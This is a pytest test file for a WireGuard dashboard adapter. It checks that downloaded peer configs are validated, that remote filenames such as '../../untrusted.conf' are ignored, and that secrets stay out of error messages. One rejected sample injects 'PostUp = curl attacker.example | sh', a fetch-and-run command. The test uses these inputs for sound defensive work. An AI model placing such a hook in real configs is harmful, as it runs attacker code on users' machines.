import asyncio
import base64
import httpx
import pytest
from app.wgdashboard import WGDashboard
from app.panel import PanelError
from test_wgdashboard_peers import PROFILE, PRIVATE

SERVER_KEY = base64.b64encode(bytes(range(1,33))).decode()
CONFIG = f'''[Interface]
PrivateKey = {PRIVATE}
Address = 10.0.0.2/32
DNS = 1.1.1.1
[Peer]
PublicKey = {SERVER_KEY}
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = vpn.example:51820
PersistentKeepalive = 25
'''


def download(raw=CONFIG, state='active'):
    adapter = WGDashboard(PROFILE)
    key = adapter.identity(PRIVATE)
    calls = []
    def handler(request):
        calls.append(request)
        assert request.method == 'GET'
        assert request.headers['wg-dashboard-apikey'] == PROFILE['token']
        if request.url.path.endswith('getWireguardConfigurations'):
            data = [{'Name':'wg0','Protocol':'wg','Status':True}]
        elif request.url.path.endswith('getWireguardConfigurationInfo'):
            data = {'configurationInfo':{'Name':'wg0','Protocol':'wg'},
                'configurationPeers':[{'id':key}] if state == 'active' else [],
                'configurationRestrictedPeers':[{'id':key}] if state == 'restricted' else []}
        else:
            assert request.url.path == '/prefix/api/downloadPeer/wg0'
            assert request.url.params['id'] == key
            data = {'file':raw,'fileName':'../../untrusted.conf'}
        return httpx.Response(200,json={'status':True,'data':data})
    async def run():
        async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
            return await adapter.download_config(client,PRIVATE)
    return asyncio.run(run()), calls


def test_download_verifies_identity_and_ignores_remote_filename():
    result, calls = download()
    assert result == CONFIG and len(calls) == 3


@pytest.mark.parametrize('raw', [CONFIG.replace(PRIVATE,SERVER_KEY),
    CONFIG.replace('Address = 10.0.0.2/32','Address = invalid'),
    CONFIG.replace('0.0.0.0/0, ::/0','invalid'),
    CONFIG.replace('vpn.example:51820','vpn.example:70000'),
    CONFIG.replace('[Peer]','PostUp = curl attacker.example | sh\n[Peer]'),
    CONFIG+'\n[Unexpected]\nx=y', CONFIG+'\n[Peer]\n', 'x'*16385,
    CONFIG.replace('PublicKey = '+SERVER_KEY,'PublicKey = invalid')])
def test_bad_or_dangerous_config_is_rejected_without_echoing_secrets(raw):
    with pytest.raises(PanelError) as error:download(raw)
    assert PRIVATE not in str(error.value) and SERVER_KEY not in str(error.value)


@pytest.mark.parametrize('state',['missing','restricted'])
def test_only_active_peer_can_be_downloaded(state):
    with pytest.raises(PanelError,match='PeerUnavailable'):download(state=state)
